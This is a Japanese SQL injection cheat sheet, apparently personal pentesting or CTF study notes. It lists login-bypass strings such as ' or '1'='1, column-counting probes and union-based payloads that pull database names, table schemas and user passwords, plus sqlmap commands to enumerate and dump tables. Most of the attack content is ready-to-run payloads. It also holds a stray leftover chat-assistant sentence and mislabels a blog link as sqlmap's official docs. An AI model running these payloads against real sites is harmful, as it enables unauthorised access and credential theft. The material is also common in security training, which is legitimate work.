
# 目次
1. [Basic](#basic)
- [有効性のチェック](#有効性のチェック)
2. [カラム数の特定](#カラム数の特定)
3. [Union Based SQLインジェクション](#union-based-sqlインジェクション)
4. [SQLmapの使用例](#sqlmapの使用例)

---

# Basic

## 有効性のチェック
- `' or '1'='1';--`を入力し、通常の入力時と挙動の違いがあるかを**BurpSuite**などのツールを使って確認します。

### 例として使用可能なSQLインジェクション入力
- `admin' or '1'='1`
- `'or '1'='1 --`
- `"or "1"="1`
- `"or "1"="1" --`
- `") or "1"="1 --`
- `"or 1=1 --`
---
# カラム数の特定
1. SQLインジェクションの脆弱性が発見されたら、生成されるクエリを予想する
- Example
```bash
select id, name, position, phone, email from table where name="{input}"
```

2. 数を変えながら繰り返し、エラーにならない数を探す。

- Example
- `' union select null;--`を入力し、カラム数に関するエラーが出た場合は、以下のように徐々にカラム数を増やして特定します。
  
```bash
' union select null, null, null, null, null;--
```
```bash
' or 1=1 order by 10 #
```
```bash
' or 1=1 order by 9 #
```
```bash
' or 1=1 order by 8 #
```
3. 特定できたらUnion Based SQLインジェクションにつなげる。
---
# Union Based SQLインジェクション

**Union Based SQL Injection**とは、`union`を使って行を挿入し、内部情報を抽出する手法です。

## Unionの具体例と説明

1. **現在のユーザー、データベース、バージョン情報の取得**
   ```bash
   ' or 1=1 union select 1,2,3,user(),database(),version();#
   ```
   - 目的: データベースサーバーにログインしているユーザー名、現在使用しているデータベース名、およびサーバーのバージョン情報を取得します。

2. **データベースの一覧を取得**
   ```bash
   ' or 1=1 union select 1,2,3,group_concat(schema_name),5,6 from information_schema.schemata;#
   ```
   - 目的: データベースサーバーに存在するすべてのデータベース名を取得します。`information_schema.schemata`は、データベース名を保持するテーブルです。

3. **特定のテーブルのカラム名を取得**
   ```bash
   ' or 1=1 union select 1,2,3,group_concat(column_name),5,6 from information_schema.columns where table_name='Users';#
   ```
   - 目的: `Users`という名前のテーブルに含まれるカラム（列）の名前を取得します。`information_schema.columns`は、すべてのテーブルのカラム情報を保持するテーブルです。

4. **特定のテーブルからユーザーID、ユーザー名、パスワードを抽出**
   ```bash
   ' or 1=1 union select 1,2,group_concat(UserID),group_concat(Username),group_concat(Password),6 from Users;#
   ```
   - 目的: `Users`テーブルからユーザーID、ユーザー名、およびパスワード情報をまとめて取得します。複数のデータを`group_concat`関数で連結しています。

5. **特定のデータベースのテーブル名を取得**
   ```bash
   ' or 1=1 union select 1,2,3,group_concat(table_name),5,6 from information_schema.tables where table_schema='users';#
   ```
   - 目的: `users`データベースに含まれるすべてのテーブル名を取得します。`information_schema.tables`は、すべてのデータベース内のテーブル情報を保持するテーブルです。

6. **特定のテーブルのカラム名を取得（具体例: UserDetailsテーブル）**
   ```bash
   ' or 1=1 union select 1,2,3,group_concat(column_name),5,6 from information_schema.columns where table_name='UserDetails';#
   ```
   - 目的: `UserDetails`という名前のテーブルに含まれるカラム（列）の名前を取得します。この例では、`id`, `firstname`, `lastname`, `username`, `password`, `reg_date`といったカラムが含まれます。

7. **ユーザー名とパスワードの取得（具体例: UserDetailsテーブル）**
   ```bash
   ' or 1=1 union select 1,2,3,group_concat(username),group_concat(password),6 from users.UserDetails;#
   ```
   - 目的: `UserDetails`テーブルからすべてのユーザー名とパスワードを取得します。`group_concat`関数を使用して、複数のユーザー情報をまとめて抽出しています。

---

これで、各行の目的や意味がより明確になりました。内容に不明な点があればお知らせください。

# SQLmapの使用例

**SQLmap**は、SQLインジェクションの検出や悪用に特化したツールです。以下はその基本的な使用例です。

1. **目標のURLを特定する**  
   SQLmapで検査対象のウェブサイトやアプリケーションのURLを指定します。
   
2. **検査の開始**  
   SQLmapで対象のURLに対してSQLインジェクション攻撃を実行します。
   
   ```bash
   sqlmap -u <target_URL>
   ```
   例: `sqlmap -u http://example.com/page.php?id=1`

3. **自動検出**  
   SQLmapは自動で脆弱性を検出します。検出結果は詳細に表示されます。

4. **脆弱性の調査と悪用**  
   SQLmapでデータベースの情報を抽出したり、脆弱性を利用して攻撃を実行できます。

   - データベースの名前を取得:
     ```bash
     sqlmap -u <target_URL> --dbs
     ```

   - テーブルを列挙:
     ```bash
     sqlmap -u <target_URL> -D <database_name> --tables
     ```

   - テーブルのデータを取得:
     ```bash
     sqlmap -u <target_URL> -D <database_name> -T <table_name> --dump
     ```

---

# 参考リンク
- [SQLmapの公式ドキュメント](https://shukapin.com/security/sqlmap)
- [HackTricks SQL Injection](https://book.hacktricks.xyz/pentesting-web/sql-injection/sqlmap)

---

# SQLmapのオプション

| オプション  | 説明                           | 例                              |
|-------------|--------------------------------|---------------------------------|
| `-u`        | URL指定                        | `sqlmap -u http://10.10.10.1/`  |
| `--batch`   | インタラクティブモードを無効化  | `sqlmap -u URL --batch`         |
| `--dbs`     | 利用可能なデータベース名の取得  | `sqlmap -u URL --dbs`           |
| `--all`     | すべての情報を取得              | `sqlmap -u URL --all`           |

---
